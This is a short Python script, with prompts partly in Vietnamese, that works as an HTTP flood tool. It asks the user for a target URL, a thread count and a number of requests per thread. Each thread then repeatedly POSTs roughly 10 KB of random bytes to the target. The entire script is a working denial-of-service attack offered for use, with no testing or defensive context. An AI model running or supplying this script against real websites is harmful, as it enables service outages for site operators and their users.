import os
import requests
import random
import threading

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

url = input("Nhập URL: ")
num_threads = int(input("Luồng (Threads: "))
requests_per_thread = int(input("Enter number of requests per thread: "))

def send_requests(thread_id):
    for i in range(requests_per_thread):
        try:
            data = random._urandom(10) * 1000
            response = requests.post(url, data=data)
            print(f"Thread {thread_id} ")
        except Exception as e:
            print(f"Thread {thread_id}: Error - {e}")

def main():
    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(i + 1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()